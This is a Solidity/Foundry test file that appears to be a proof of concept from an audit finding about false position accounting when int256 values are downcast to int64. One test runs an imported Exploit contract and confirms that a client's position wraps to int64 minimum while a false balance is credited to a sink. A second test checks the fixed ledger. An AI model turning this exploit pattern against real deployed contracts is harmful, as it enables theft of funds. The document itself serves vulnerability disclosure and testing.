// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    LedgerFixed
} from "./59726-false-accounting-in-position-due-to-downcasting-int256-to-in.sol";

contract PoC_59726_Int64Downcast is Test {
    function test_run_positionBecomesInt64Min() public {
        Exploit exp = new Exploit();
        exp.run();

        int256 pos = int256(exp.ledger().clientPositions(1, exp.CLIENT()));
        emit log_named_int("stored client position", pos);

        assertEq(pos, int256(type(int64).min), "position");
        assertEq(exp.marker().balanceOf(exp.SINK()), exp.FALSE_MAGNITUDE(), "magnitude");
    }

    function test_control_int256KeepsPositiveSum() public {
        LedgerFixed fixedLedger = new LedgerFixed();
        address client = 0x2222222222222222222222222222222222222222;
        int64 size = 4611686018427387904;
        LedgerFixed.PositionParam[] memory one = new LedgerFixed.PositionParam[](1);
        one[0] = LedgerFixed.PositionParam({contractId: 1, client: client, size: size});
        fixedLedger.updatePositions(one);
        fixedLedger.updatePositions(one);

        int256 pos = fixedLedger.clientPositions(1, client);
        emit log_named_int("control position", pos);

        assertEq(pos, int256(9223372036854775808), "sum");
        assertNotEq(pos, int256(type(int64).min), "must not wrap");
    }
}
